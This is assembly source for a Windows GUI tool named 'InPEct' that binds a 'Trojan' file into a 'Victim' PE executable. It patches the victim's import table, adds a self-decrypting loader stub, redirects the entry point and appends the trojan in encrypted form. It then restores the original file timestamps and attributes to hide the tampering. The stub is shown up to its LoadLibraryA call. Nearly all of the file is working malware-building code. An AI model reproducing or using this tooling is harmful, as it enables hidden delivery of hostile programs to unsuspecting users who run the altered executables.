        P386
        MODEL   flat, stdcall
        LOCALS

INCLUDE W32.inc
INCLUDE Imghdr.inc

EXTRN	CreateDirectoryA		: PROC
EXTRN	SHGetSpecialFolderLocation	: PROC
EXTRN	SHBrowseForFolder		: PROC
EXTRN	SHGetPathFromIDList		: PROC
EXTRN	VirtualAlloc			: PROC
EXTRN	VirtualFree			: PROC
EXTRN	GetFileAttributesA		: PROC
EXTRN	SetFileAttributesA		: PROC
EXTRN	GetFileTime			: PROC
EXTRN	SetFileTime			: PROC
EXTRN	LocalFree			: PROC
EXTRN   FormatMessageA                  : PROC
EXTRN	IsDlgButtonChecked		: PROC
EXTRN	CheckDlgButton			: PROC


        DATASEG

IDI_ICON	EQU		100
IDD_DIALOG	EQU		100
IDC_VICTIM	EQU		100
IDC_TROJAN	EQU		200
IDC_OUTDIR	EQU		300
IDC_LVICTIM	EQU		1000
IDC_LTROJAN	EQU		2000
IDC_LOUTDIR	EQU		3000
IDC_WWW		EQU		4000
IDC_INPECT	EQU		5000
IDC_SMART	EQU		6000


BROWSEINFO	STRUC
hwndOwner	HWND	?
pidlRoot	LPCVOID	?
pszDisplayName	LPSTR	?
lpszTitle	LPCSTR	?
ulFlags		UINT	?
lpfn		LPFN	?
lParam_         LPARAM  ?
iImage		UINT	?
BROWSEINFO	ENDS


bTitle		DB	"Select output directory:", NULL
URL		DB	"http://sysdlabs.hypermart.net/proj/exe.html#inpect", NULL

OutDir		DB	"\Output", NULL
OutDir_		EQU	$ - offset OutDir

KERNEL32        DB      "KERNEL32.DLL", NULL
MarkFmt		DB	"{FE5451A1-ABFE-BF4F-EAFE-%012X}", NULL

CRLF		EQU	0Dh, 0Ah
Warn			DB	"Warning!!!", NULL
EDataWarn               DB      "Extra data was found at end of Victim file.", CRLF
                        DB      "Do you want to keep it?", NULL

Succ			DB	"Success!!!", NULL
SuccMsg			DB	"InPEction successfull!", NULL
Err			DB	"Error", NULL
ErrMsg			DB	"InPEction failed!!!", NULL

CopyErr			DB	"Error copying file!!!", NULL
VictimErr		DB	"Can't open Victim file!", NULL
TrojanErr		DB	"Can't open Trojan file!", NULL
InfectionErr            DB      "Error inPEcting!!!", NULL
ReadVErr		DB	"Can't read from Victim!", NULL
ReadTErr		DB	"Can't read from Trojan!", NULL
WriteErr		DB	"Can't write to Victim!", NULL

InvalidExeErr           DB      "Victim file isn't a Win32 PE format executable!", NULL
NoKernelDescrErr	DB	"No KERNEL32.DLL desciptor found in program's Import Table!", NULL
ThunkOutOfITErr		DB	"KERNEL32.DLL thunks out of Import Table's section!", CRLF
			DB	"(Maybe file already inPEcted?)", NULL
FuncNameOutOfITErr	DB	"Function Name string out of Import Table's section!", NULL


MaxFuncNameLen	EQU	11h
FuncN = 0
MyITContains MACRO functions
 IRP	Func, <functions>
	_Func = $
	DB	Func, (MaxFuncNameLen - ($ - _Func)) DUP (NULL)
	FuncN = FuncN + 1
 ENDM
ENDM

Functs:
MyITContains	<"GetTempPathA", "GetTempFileNameA">
MyITContains	<"CreateFileA", "WriteFile", "CloseHandle">
MyITContains	<"VirtualAlloc", "VirtualFree">
MyITContains	<"GetStartupInfoA", "CreateProcessA", "GetModuleHandleA">
MyITContains	<"LoadLibraryA", "GetProcAddress">

MyITNames_      EQU     ($ - offset Functs) + (2 * FuncN)
Redir_		EQU	6h


VictimFilter	DB	"PE (Win32) Executable Files (*.exe)", NULL, "*.exe", NULL
		DB	NULL
TrojanFilter	DB	"Windows Executable Files (*.exe)", NULL, "*.exe", NULL
		DB	"All Files", NULL, "*.*", NULL
		DB	NULL

        UDATASEG

Smart_code	DW	?

hInst           DD      ?
hWnd		DD	?
Handle1         DD      ?
Handle2         DD      ?
lpErrMsgBuf	DD	?
bytes_rdwr      DD      ?

idl		DD	?
bi              BROWSEINFO      <?>
bBuffer         DB      MAX_PATH DUP (?)

PathName	DB	MAX_PATH DUP(?)
PathName_	EQU	MAX_PATH - 1
Victim		DB	MAX_PATH DUP(?)
Trojan		DB	MAX_PATH DUP(?)

PE_Header       IMAGE_NT_HEADERS        <?>             ; PE Header struc
Obj_Table       IMAGE_SECTION_HEADER    0Fh DUP (<?>)   ; Section Table struc

PEH_Offset      DD      ?
ITS_Offset      DD      ?
ITS_Size	DD	?
EData           DD      ?

ITSectAddr      DD      ?
MemIT           DD      ?
KernDescrPos    DD      ?


MyITNames       DB      MyITNames_ DUP (?)
MyITAddrs       DB      (4 * FuncN) DUP (?)
FuncAddr	DD	?


Thunks_         DD      ?
MyFirstThunk	DD	?
ExistentThunks	DD	?
_FirstThunk	DD	?


Buffer_		EQU	32768
Buffer		DB	Buffer_ DUP (?)

Attr		DD	?

reg_bak         DD      ?
rnd_seed	DD	?

OFN		OPENFILENAME	<?>

SysTime		SYSTEMTIME	<?>
lpLastWriteTime		FILETIME	<?>
lpLastAccessTime	FILETIME	<?>
lpCreationTime		FILETIME	<?>


PE_Header_Len	EQU	SIZE Obj_Table + SIZE PE_Header
Ldr_Len	EQU	offset Ldr_End - offset Ldr_Start
Enc_Len		EQU	offset Ldr_End - offset Encrypted_Start


KEY_ALL_ACCESS		EQU	0F003Fh
CSIDL_DRIVES		EQU	11h
BIF_RETURNONLYFSDIRS	EQU	1h
        CODESEG

Start:
        call    GetModuleHandle, NULL
        mov     [hInst], eax

	; backup compiled code ;)
	mov	ax, WORD PTR [Smart]
	mov	[Smart_code], ax

        ; Set "random" seed
        call    GetSystemTime, offset SysTime
        movzx   ax, WORD PTR [SysTime.st_wMilliseconds]
        mul     WORD PTR [SysTime.st_wSecond]
        mul     WORD PTR [SysTime.st_wMinute]
        mov     [rnd_seed], eax


	call    DialogBoxParam, hInst, IDD_DIALOG, NULL, offset DlgProc, NULL
	call    ExitProcess, eax


DlgProc PROC
	ARG	@@hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM

	push	[@@hWnd]
	pop	[hWnd]


        ; Permutate seed
        call    GetSystemTime, offset SysTime
        mov     eax, [rnd_seed]
        movzx   cx, WORD PTR [SysTime.st_wMilliseconds]
        rol     eax, 5
	xor	eax, ecx
        mov     [rnd_seed], eax


	mov	eax, [uMsg]

        cmp     ax, WM_INITDIALOG
	jz	@@InitDialog
        cmp     ax, WM_COMMAND
        jz      @@Command
        cmp     ax, WM_CLOSE
        jz      @@Close

@@RetFalse:
	xor	eax, eax
	ret


@@Close:
	call	EndDialog, hWnd, NULL
        jmp     @@RetTrue


@@InitDialog:
	call    LoadIcon, hInst, IDI_ICON
	call    SendMessage, hWnd, 80h, 0, eax

	call	CheckDlgButton, hWnd, IDC_SMART, TRUE

	call	GetCurrentDirectory, PathName_, offset PathName
	mov	edi, offset PathName
	mov	ecx, PathName_
	xor	al, al
	repnz	scasb
	dec	edi

	dec	edi
	cmp	BYTE PTR [edi], '\'
	jz	@@Dir
	inc	edi

@@Dir:
	mov	esi, offset OutDir
	mov	ecx, OutDir_
	rep	movsb

	call	CreateDirectoryA, offset PathName, NULL
	or	eax, eax
	jnz	@@SetOut
	call	GetLastError
	cmp	eax, ERROR_ALREADY_EXISTS
	jz	@@SetOut
	call	GetCurrentDirectory, PathName_, offset PathName

@@SetOut:
	call	SetDlgItemText, hWnd, IDC_OUTDIR, offset PathName

	mov	[OFN.on_lStructSize], OPENFILENAME_
	mov	[OFN.on_nMaxFile], MAX_PATH - 1
	mov 	[OFN.on_Flags], OFN_PATHMUSTEXIST + OFN_FILEMUSTEXIST + OFN_HIDEREADONLY
	mov	[OFN.on_lpstrFile], offset PathName
	push	[hWnd]
	pop	[OFN.on_hwndOwner]
	push	[hInst]
	pop	[OFN.on_hInstance]

	call	SHGetSpecialFolderLocation, NULL, CSIDL_DRIVES, offset idl;

	push	[idl]
	pop	[bi.pidlRoot]
        mov     [bi.pszDisplayName], offset bBuffer
        mov     [bi.lpszTitle], offset bTitle
        mov     [bi.ulFlags], BIF_RETURNONLYFSDIRS

        jmp     @@RetTrue


@@Command:
	mov	eax, [wParam]

	cmp	ax, IDC_LVICTIM
	jz	@@LocateVictim
	cmp	ax, IDC_LTROJAN
	jz	@@LocateTrojan
	cmp	ax, IDC_LOUTDIR
	jz	@@LocateOutDir
	cmp	ax, IDC_WWW
	jz	@@WWW
	cmp	ax, IDC_INPECT
	jnz	@@RetTrue

@@inPEct:
	mov	eax, [rnd_seed]
	call	do_inPEct
	jmp	@@RetTrue

@@LocateOutDir:
	call	SHBrowseForFolder, offset bi
	or	eax, eax
	jz	@@RetTrue
	call	SHGetPathFromIDList, eax, offset PathName
	call	SetDlgItemText, hWnd, IDC_OUTDIR, offset PathName
	jmp	@@RetTrue

@@LocateVictim:
	call	LocateFile, offset VictimFilter
	call	SetDlgItemText, hWnd, IDC_VICTIM, offset PathName
	jmp	@@RetTrue

@@LocateTrojan:
	call	LocateFile, offset TrojanFilter
	call	SetDlgItemText, hWnd, IDC_TROJAN, offset PathName
	jmp	@@RetTrue

@@WWW:
	call	ShellExecuteA, hWnd, NULL, offset URL, NULL, NULL, NULL


@@RetTrue:
	mov	eax, TRUE
	ret


do_inPEct PROC
	USES	ebx, ecx, edx, esi, edi

	call	IsDlgButtonChecked, hWnd, IDC_SMART
	.if	eax == BST_CHECKED
		mov	ax, 9090h	; 2 NOPs
	.else
		mov	ax, [Smart_code]
	.endif
	mov	WORD PTR [Smart], ax

	call	GetDlgItemText, hWnd, IDC_TROJAN, offset Trojan, PathName_
	call	GetDlgItemText, hWnd, IDC_VICTIM, offset PathName, PathName_
	mov	esi, offset PathName
	xor	edi, edi
	mov	ecx, PathName_

@@GetFName:
	lodsb
	or	al, al
	jz	@@Finish
	cmp	al, '\'
	jnz	@@GetFName
	mov	edi, esi
	jmp	@@GetFName

@@Finish:
	or	edi, edi
	jnz	@@Found
	mov	edi, offset PathName

@@Found:
	mov	ecx, esi
	sub	ecx, edi
	push	ecx

	xchg	edi, esi

	call	GetDlgItemText, hWnd, IDC_OUTDIR, offset Victim, PathName_
	mov	edi, offset Victim
	mov	ecx, PathName_
	xor	al, al
	repnz	scasb

	dec	edi

	cmp	edi, offset Victim
	jz	@@Dir
	
	dec	edi
	cmp	BYTE PTR [edi], '\'
	jz	@@Dir
	inc	edi
        mov     BYTE PTR [edi], '\'

@@Dir:
	inc	edi

	pop	ecx
	rep	movsb

	call	CopyFile, offset PathName, offset Victim, TRUE
	call	SYSERR, offset CopyErr
	jnz	@@Failed

	call	InPEct
	or	eax, eax
	jnz	@@Success

@@Failed:
	call	MessageBox, hWnd, offset ErrMsg, offset Err, \
		MB_OK + MB_ICONSTOP + MB_TASKMODAL
	ret

@@Success:
	call	MessageBox, hWnd, offset SuccMsg, offset Succ, \
		MB_OK + MB_ICONINFORMATION + MB_TASKMODAL
	ret
do_inPEct ENDP


LocateFile PROC
        ARG     MyFilter:DWORD

        push    [MyFilter]
	pop	[OFN.on_lpstrFilter]

	call    GetOpenFileName, offset OFN

	ret
LocateFile ENDP

DlgProc ENDP


InPEct PROC
	; Save Victim file attributes
	call	GetFileAttributesA, offset Victim
	mov	[Attr], eax
	; Reset 'em
	call	SetFileAttributesA, offset Victim, FILE_ATTRIBUTE_NORMAL


        ; Open Victim file
        call    CreateFile, offset Victim, GENERIC_READ + GENERIC_WRITE,\
                0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
	mov	[Handle1], eax
	call	HandleERR, offset VictimErr
	jnz	@@Err1

	; Save Victim file time
	push	eax
	call    GetFileTime, eax, \
		offset lpLastWriteTime, \
		offset lpLastAccessTime, \
         	offset lpCreationTime 
	pop	eax


        ; Open Trojan file
        call    CreateFile, offset Trojan, GENERIC_READ,\
                0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
        mov     [Handle2], eax
	call	HandleERR, offset TrojanErr
	jnz	@@Err2

	call	GetFileSize, Handle2, NULL
	mov	[Data_], eax

        ; Get Header's offset
        call    SetFilePointer, Handle1, 3Ch, 0, FILE_BEGIN
        call    ReadFile, Handle1, offset PEH_Offset, 4, offset bytes_rdwr, 0
	call	SYSERR, offset ReadVErr
	jnz	@@Err2

        ; Read Header to respective struc
        call    SetFilePointer, Handle1, PEH_Offset, 0, FILE_BEGIN
        call    ReadFile, Handle1, offset PE_Header, PE_Header_Len, offset bytes_rdwr, 0
	call	SYSERR, offset ReadVErr
	jnz	@@Err2

        ; Is it PE Header?
        cmp     [PE_Header.Signature], IMAGE_NT_SIGNATURE
        jnz     @@InvalidExeErr


	; Suposes that ANY executable has some Import Table
        call    Find_IT
	or	eax, eax
	jnz	@@Err2


        call    Find_Descr
	or	eax, eax
	jnz	@@Err2


        ; Locate last section and put it's offset in esi
        movzx   eax, [PE_Header.FileHeader.NumberOfSections]
        dec     eax
        FASTIMUL esi, eax, IMAGE_SECTION_HEADER_        ; FASTIMUL RULES!!!
        add     esi, offset Obj_Table


	; Check for extra data
	call	GetFileSize, Handle1, NULL
	mov     ebx, [esi.PointerToRawData]
	add     ebx, [esi.SizeOfRawData]
	sub	eax, ebx
        mov     [EData], eax
	or	eax, eax
	jz	@@Proceed
        ; Ask what to do...
	call	MessageBox, hWnd, offset EDataWarn, offset Warn,\
		MB_YESNOCANCEL + MB_ICONWARNING + MB_TASKMODAL
	cmp	eax, IDYES
	jz	@@Proceed
	cmp	eax, IDCANCEL
	jz	@@Err2
        ; Force extra data cut
        xor     eax, eax
        mov     [EData], eax

@@Proceed:

	; Set new flags
        mov     eax, [esi.SFlags]
        and     eax, IMAGE_SCN_MEM_NOT_DISCARDABLE
        or      eax, IMAGE_SCN_MEM_EXECUTE +\
                     IMAGE_SCN_MEM_READ +\
                     IMAGE_SCN_MEM_WRITE
        mov     [esi.SFlags], eax


	; Hahah, ate thiz, fuckin' Win2K!!!!
	xor	eax, eax
	mov     [PE_Header.OptionalHeader.DataDirectory.(IMAGE_DIR_IAT).VirtualAddress], eax
	mov     [PE_Header.OptionalHeader.DataDirectory.(IMAGE_DIR_IAT).Size], eax
	mov     [PE_Header.OptionalHeader.DataDirectory.(IMAGE_DIRY_BOUND_IMPO).VirtualAddress], eax
	mov     [PE_Header.OptionalHeader.DataDirectory.(IMAGE_DIRY_BOUND_IMPO).Size], eax
	mov	[edi.TimeDateStamp], eax
	not	eax
	mov	[edi.ForwarderChain], eax


        mov     eax, [esi.SVirtualAddress]
        add     eax, [esi.SizeOfRawData]
        add     eax, [EData]
	mov     [MyFirstThunk], eax

        ; Where to write new code?
        mov     eax, [esi.PointerToRawData]
        add     eax, [esi.SizeOfRawData]
        add     eax, [EData]
        call    SetFilePointer, Handle1, eax, 0, FILE_BEGIN


        mov     edx, offset MyITNames
        mov     ecx, offset MyITAddrs

	mov	[FuncAddr], offset Redirectors

;************************************************
WalkDescrs MACRO
now = 0
 WHILE now LT (FuncN * MaxFuncNameLen)
        call    Walk_Descr, offset Functs + now
        or      eax, eax
        jz      @@Err2
	now = now + MaxFuncNameLen
 ENDM
ENDM

        WalkDescrs
;************************************************

        sub     edx, offset MyITNames
	mov	eax, offset MyITAddrs
        sub     ecx, eax

	mov	ebx, ecx
	add	ebx, [Thunks_]

	push	ecx
	mov	ecx, [MyThunks]

@@10:
	add	[eax], ebx
	add	eax, 4h
	loop	@@10
	pop	ecx


	push	[edi.FirstThunk]
	pop	[Extrn_IT]

	mov	eax, [MyFirstThunk]
	mov	[edi.FirstThunk], eax
        add     eax, ecx
        mov     [Local_IT], eax

	add	eax, edx
        add     eax, [Thunks_]
	add	eax, Ldr_Len
	mov	[Data], eax


	; Set file size
        mov     eax, [EData]
	add	eax, ecx
	add	eax, edx
	add	eax, [Thunks_]
	add	eax, Ldr_Len
	add	eax, [Data_]
	call	SetSize


        ; Update Entry Point
        mov     eax, [MyFirstThunk]
        add     eax, [Thunks_]
        add     eax, ecx
        add     eax, edx
        mov     [Ldr_RVA], eax
        mov     [PE_Header.OptionalHeader.DataDirectory.(IMAGE_DIR_RELOC).VirtualAddress], eax
        xchg    [PE_Header.OptionalHeader.AddressOfEntryPoint], eax
        mov     [Entry_RVA], eax


        ; Write new Thunks
        mov     [reg_bak], edx
        call    WriteFile, Handle1, offset MyITAddrs, ecx, offset bytes_rdwr, 0
	call	SYSERR, offset WriteErr
	jnz	@@Err2
        call    WriteFile, Handle1, ExistentThunks, Thunks_, offset bytes_rdwr, 0
	call	SYSERR, offset WriteErr
	jnz	@@Err2
        call    WriteFile, Handle1, offset MyITNames, reg_bak, offset bytes_rdwr, 0
	call	SYSERR, offset WriteErr
	jnz	@@Err2



        ; Set Trojan's size
        mov     eax, [Data_]
        add     eax, Enc_Len
        call    DivBy4
        mov     [_count], eax

	; Set Trojan's fingerprint
        mov     eax, [rnd_seed]
        mov     [_seed], eax

        push    eax
        push    offset MarkFmt
        push    offset Mark
        call    _wsprintfA
        add     esp, 4 * 3


        ; Write out Loader
        call    WriteFile, Handle1, offset Ldr_Start, (offset Encrypted_Start - offset Ldr_Start), offset bytes_rdwr, 0
	call	SYSERR, offset WriteErr
	jnz	@@Err2

        ; Encrypted part
        call    Encrypt, offset Encrypted_Start, offset Buffer, Enc_Len / 4
        call    WriteFile, Handle1, offset Buffer, Enc_Len, offset bytes_rdwr, 0
	call	SYSERR, offset WriteErr
	jnz	@@Err2


	; Write our Data
        mov     [reg_bak], esi

@@Write:
	call	ReadFile, Handle2, offset Buffer, Buffer_, offset bytes_rdwr, 0
	call	SYSERR, offset ReadTErr
	jnz	@@Err2

	mov	eax, [bytes_rdwr]
	or	eax, eax
	jz	@@Wrote

        mov     eax, [bytes_rdwr]
        call    DivBy4
        call    Encrypt, offset Buffer, offset Buffer, eax
        call    WriteFile, Handle1, offset Buffer, bytes_rdwr, offset bytes_rdwr, 0
	call	SYSERR, offset WriteErr
	jnz	@@Err2

	jmp	@@Write

@@Wrote:
        ; Clean buffer
	push	edi
	mov	edi, offset Buffer
        mov     ecx, Buffer_ / 4
        xor     eax, eax
        rep     stosd
	pop	edi

        ; Set padding
        call    WriteFile, Handle1, offset Buffer,\
                [PE_Header.OptionalHeader.FileAlignment],\
                offset bytes_rdwr, 0
	call	SYSERR, offset WriteErr
	jnz	@@Err2


        mov     esi, [reg_bak]


        ; Rewrite PE Header
        call    SetFilePointer, Handle1, PEH_Offset, 0, FILE_BEGIN
        call    WriteFile, Handle1, offset PE_Header, PE_Header_Len,\
                offset bytes_rdwr, 0
	call	SYSERR, offset WriteErr
	jnz	@@Err2

	; Rewrite KERNEL32 import descriptor
	xor	eax, eax
        mov     [edi.OrigFirstThunk], eax
        call    SetFilePointer, Handle1, KernDescrPos, 0, FILE_BEGIN
        call    WriteFile, Handle1, edi, IMAGE_IMPORT_DESCRIPTOR_,\
		offset bytes_rdwr, 0
	call	SYSERR, offset WriteErr
	jnz	@@Err2


	; Cut out file's fat ;)
	mov     eax, [esi.PointerToRawData]
	add     eax, [esi.SizeOfRawData]
	call    SetFilePointer, Handle1, eax, 0, FILE_BEGIN
	call    SetEndOfFile, Handle1

	; Restore attributes
	call	SetFileAttributesA, offset Victim, [Attr]
	call	SetFileTime, Handle1, \
		offset lpLastWriteTime, \
		offset lpLastAccessTime, \
         	offset lpCreationTime 


Bye PROC
        call    CloseHandle, Handle1
        call    CloseHandle, Handle2

	call	VirtualFree, [ITS_Offset], [ITS_Size], MEM_DECOMMIT
	
	ret
Bye ENDP


@@InvalidExeErr:
        call    MessageBox, hWnd, offset InvalidExeErr, offset InfectionErr,\
		MB_OK + MB_ICONSTOP + MB_TASKMODAL


@@Err2:
	call	Bye

@@Err1:
	call	DeleteFile, offset Victim
	xor	eax, eax
	ret
InPEct ENDP


Find_IT PROC
        USES    eax, ecx, edx

        ; Reteive section containing Import Table
        call    GetSection, [PE_Header.OptionalHeader.DataDirectory.(IMAGE_DIR_IMPORT).VirtualAddress]

	push	[esi.SizeOfRawData]
	pop	[ITS_Size]

        ; Read this section...
        call    VirtualAlloc, 0, [ITS_Size], MEM_COMMIT, PAGE_READWRITE
        mov     [ITS_Offset], eax
        call    SetFilePointer, Handle1, [esi.PointerToRawData], 0, FILE_BEGIN
        call    ReadFile, Handle1, ITS_Offset, [ITS_Size], offset bytes_rdwr, 0
	call	SYSERR, offset ReadVErr
	jnz	@@ReadErr

        mov     edi, [ITS_Offset]
        add     edi, [PE_Header.OptionalHeader.DataDirectory.(IMAGE_DIR_IMPORT).VirtualAddress]
        sub     edi, [esi.SVirtualAddress]

        mov     eax, [esi.SVirtualAddress]
        mov     [ITSectAddr], eax

	; Update flags
        mov     eax, [esi.SFlags]
        and     eax, IMAGE_SCN_MEM_NOT_DISCARDABLE
        or      eax, IMAGE_SCN_MEM_EXECUTE +\
                     IMAGE_SCN_MEM_READ +\
                     IMAGE_SCN_MEM_WRITE
        mov     [esi.SFlags], eax

        ret

@@ReadErr:
	xor	eax, eax
	ret
Find_IT ENDP


Find_Descr PROC

@@10:
        cmp     [edi.FirstThunk], 0h
        jz      @@NoKernelDescr
        mov     eax, [ITS_Offset]
        sub     eax, [esi.SVirtualAddress]
        mov     [MemIT], eax
        add     eax, [edi.NameRVA]

        push    esi
        push    edi
        mov     esi, eax
        mov     edi, offset KERNEL32

@@20:
        lodsb
        cmp     al, 'a'
        jb      @@55         ; al >= 'a'?
        cmp     al, 'z'
        ja      @@55         ; al <= 'z'?
        sub     al, 'a' - 'A'           ; translate to uppercase

@@55:
        scasb
        jnz     short @@30
        or      al, al
        jnz     short @@20

@@30:
        pop     edi
        pop     esi

        jz      short @@50

        add     edi, IMAGE_IMPORT_DESCRIPTOR_
        jmp     short @@10

@@50:
        mov     eax, edi
        sub     eax, [ITS_Offset]
        add     eax, [esi.PointerToRawData]
        mov     [KernDescrPos], eax


	mov	eax, [edi.OrigFirstThunk]
	or	eax, eax
	jnz	@@60
	mov	eax, [edi.FirstThunk]

@@60:
	mov	[ExistentThunks], eax


        call    GetSection, eax
        mov     eax, [esi.SVirtualAddress]
        cmp     [ITSectAddr], eax
        jnz     @@ThunkOutOfIT

	push	[edi.FirstThunk]
	pop	[_FirstThunk]

	push	edi
	mov	eax, [ExistentThunks]
	add	eax, [MemIT]
	mov	[ExistentThunks], eax
	mov	edi, eax
	xor	eax, eax
	mov	ecx, eax
	not	ecx
	repnz	scasd

	not	ecx
	mov	[Thunks], ecx
	shl	ecx, 2
	mov	[Thunks_], ecx
	pop	edi

        ret


@@NoKernelDescr:
        call    MessageBox, hWnd, offset NoKernelDescrErr, offset InfectionErr,\
		MB_OK + MB_ICONSTOP + MB_TASKMODAL
	ret

@@ThunkOutOfIT:
        call    MessageBox, hWnd, offset ThunkOutOfITErr, offset InfectionErr,\
		MB_OK + MB_ICONSTOP + MB_TASKMODAL
	ret
Find_Descr ENDP


Walk_Descr PROC
        ARG     Function:DWORD
        USES    ebx, esi, edi

	mov	eax, [ExistentThunks]

@@10:
        mov     esi, [eax]
        or      esi, esi
        jz      short @@NotFound

	mov	ebx, eax

        push    esi
        call    GetSection, esi
        mov     eax, [esi.SVirtualAddress]
        cmp     [ITSectAddr], eax
        pop     esi
        jnz     @@FuncNameOutOfIT

        add     esi, [MemIT]
        inc     esi
        inc     esi
        mov     edi, [Function]

@@20:
        lodsb
        scasb
        jnz     short @@30
        or      al, al
        jnz     short @@20

@@30:
	mov	eax, ebx

        jz      @@Found

        add     eax, 4h
        jmp     @@10

        ; Not found...
@@NotFound:
	mov	[ecx], edx
        mov     eax, [MyFirstThunk]
	add	[ecx], eax
        sub     DWORD PTR [ecx], offset MyITNames

	mov	ebx, ecx
	sub	ebx, offset MyITAddrs
	add	ebx, [MyFirstThunk]

        add     ecx, 4h

        mov     esi, [Function]
        inc     edx
        inc     edx
        mov     edi, edx

@@CopyFName:
        lodsb
        stosb
        inc     edx
        or      al, al
        jnz     @@CopyFName


@@SetRedir:
	mov	eax, [FuncAddr]
	inc	eax
	inc	eax
	mov	[eax], ebx
	add	[FuncAddr], Redir_

        ; EAX <> 0
        ret

@@Found:
        sub     ebx, [ExistentThunks]
	add	ebx, [_FirstThunk]
	jmp	@@SetRedir


@@FuncNameOutOfIT:
        call    MessageBox, hWnd, offset FuncNameOutOfITErr, offset InfectionErr,\
		MB_OK + MB_ICONSTOP + MB_TASKMODAL
        xor     eax, eax
        ret
Walk_Descr ENDP


SetSize PROC
	USES	ecx, ebx, edx, edi

	; Kick out current section's size
	mov	ebx, [esi.SizeOfRawData]
	sub	[PE_Header.OptionalHeader.SizeOfInitializedData], ebx

        ; Calculate Raw Data size (aligned)
	add	eax, ebx
        push    eax

        mov     ecx, [PE_Header.OptionalHeader.FileAlignment]
        call    Align
        mov     [esi.SizeOfRawData], eax

	; Set new size  of Initialized Data
	add	[PE_Header.OptionalHeader.SizeOfInitializedData], eax


	; Check if last serction is in Directory
	mov	edi, offset PE_Header + 78h
	mov	ebx, [esi.SVirtualAddress]
	mov	ecx, IMAGE_NUMBEROF_DIRECTORY_ENTRIES

@@10:
        cmp     [edi.VirtualAddress], ebx
	jnz	@@20
	mov	[edi.Size], eax

@@20:
	add	edi, IMAGE_DATA_DIRECTORY_
	loop	@@10


        ; Calculate Virtual Size (aligned)
        pop     eax
        mov     ecx, [PE_Header.OptionalHeader.SectionAlignment]
        call    Align
        mov     [esi.SVirtualSize], eax

	; Adjust size of image (aligned)
	add	eax, [esi.SVirtualAddress]

	mov     ecx, [PE_Header.OptionalHeader.SectionAlignment]
	call    Align
	mov	[PE_Header.OptionalHeader.SizeOfImage], eax

	ret
SetSize ENDP


GetSection PROC
        ARG     RVA:DWORD
        USES    eax, ebx, ecx

        mov     eax, [RVA]
        movzx   ecx, [PE_Header.FileHeader.NumberOfSections]
        mov     esi, offset Obj_Table

@@10:
        mov     ebx, [esi.SVirtualAddress]
        cmp     eax, ebx
        jb      short @@20
        add     ebx, [esi.SizeOfRawData]
        cmp     eax, ebx
        jb      short @@30

@@20:
        add     esi, IMAGE_SECTION_HEADER_
        loop    short @@10

@@30:
        ret
GetSection ENDP


Align PROC
        USES    edx

        xor     edx, edx
        div     ecx
        test    edx, edx
        jz      short @@10
        inc     eax

@@10:
        mul     ecx

        ret
Align ENDP


HandleERR PROC
	ARG	Type:DWORD

	cmp	eax, INVALID_HANDLE_VALUE
	jz	SYSERR_Check
	jmp	SYSERR_OK
HandleERR ENDP


SYSERR PROC
	ARG	Type:DWORD

	or	eax, eax
	jnz	SYSERR_OK

SYSERR_Check:
	call	GetLastError
	call	FormatMessageA, 1100h, NULL, eax, 400h, offset lpErrMsgBuf, 0, NULL
	call	MessageBox, hWnd, lpErrMsgBuf, Type, \
		MB_OK + MB_ICONSTOP + MB_TASKMODAL
	call	LocalFree, lpErrMsgBuf

	inc	eax
	jmp	@@Failed

SYSERR_OK:
	xor	eax, eax

@@Failed:
	or	eax, eax
	ret
SYSERR ENDP


Encrypt PROC
        ARG     src:DWORD, dst:DWORD, len:DWORD
	USES	ecx, edx, esi, edi

        mov     edx, [rnd_seed]
        mov     esi, [src]
        mov     edi, [dst]
        mov     ecx, [len]

@@10:
        lodsd
        xor     eax, edx
        rol     edx, 7
        add     edx, eax
        stosd
        loop    @@10

        mov     [rnd_seed], edx
	ret
Encrypt ENDP


DivBy4 PROC
        USES    ebx, edx

	xor	edx, edx
	mov	ebx, 4
        div     ebx
        or      edx, edx
        jz      @@NoRest
	inc	eax

@@NoRest:
	ret
DivBy4 ENDP


        DATASEG

@Redirectors	= Redirectors		- Ldr_Start

@Entry_RVA      = Entry_RVA             - Ldr_Start
@Ldr_RVA        = Ldr_RVA               - Ldr_Start
@ImageBase_RVA  = ImageBase_RVA         - Ldr_Start

@Local_IT       = Local_IT              - Ldr_Start
@Extrn_IT       = Extrn_IT              - Ldr_Start
@Thunks         = Thunks                - Ldr_Start
@MyThunks       = MyThunks              - Ldr_Start

@DLL_Name	= DLL_Name		- Ldr_Start
@Func1_Name	= Func1_Name		- Ldr_Start
@Func2_Name	= Func2_Name		- Ldr_Start
@hKey		= hKey			- Ldr_Start
@hLib		= hLib			- Ldr_Start

@TempPath	= TempPath		- Ldr_Start
@TempFile	= TempFile		- Ldr_Start
@Prefix		= Prefix		- Ldr_Start
@FileHandle	= FileHandle		- Ldr_Start
@Aux		= Aux			- Ldr_Start

@lSI		= lSI			- Ldr_Start
@lPI		= lPI			- Ldr_Start

@RegKey		= RegKey		- Ldr_Start
@Mark		= Mark			- Ldr_Start

@Data_		= Data_			- Ldr_Start
@Data           = Data                  - Ldr_Start


Ldr_Start:
;	pushfd
;	pushad
	call	Delta

Delta:
        pop     ebp
        push    ebp


	add	ebp, offset Encrypted_Start - Delta
        mov     esi, ebp
        mov     edi, esi

;       mov     ecx, _count
        DB      0B9h
_count  DD      ?

;       mov     edx, _seed
        DB      0BAh
_seed   DD      ?

@@Decrypt:
	lodsd
        mov     ebx, eax
        xor     eax, edx
        rol     edx, 7
        add     edx, ebx
	stosd
        loop    @@Decrypt


Encrypted_Start:
        pop     ebp
        sub     ebp, offset Delta - Ldr_Start

	mov	eax, ebp
        sub     eax, [ebp + @Ldr_RVA]                   ; Get ImageBase...
        mov     [ebp + @ImageBase_RVA], eax             ; ...And store for later
	add	[ebp + @Data], eax


	mov	edi, @Redirectors
	add	edi, ebp
	mov	ecx, [ebp + @MyThunks]

@@SetRedirRVAs:
	inc	edi
	inc	edi
	add	[edi], eax
	add	edi, 4h
	loop	@@SetRedirRVAs


        mov     esi, [ebp + @Local_IT]
        add     esi, eax
        mov     edi, [ebp + @Extrn_IT]
        add     edi, eax
        mov     ecx, [ebp + @Thunks]
        rep     movsd					; MOVSD goes faster ;)


Smart:
	jmp	short @@Load


	lea	eax, [ebp + @DLL_Name] 
	call	@_LoadLibraryA, eax
	or	eax, eax
	jz	short @@Load
	mov	[ebp + @hLib], eax

	lea	edx, [ebp + @Func1_Name]
	call	@_GetProcAddress, eax, edx
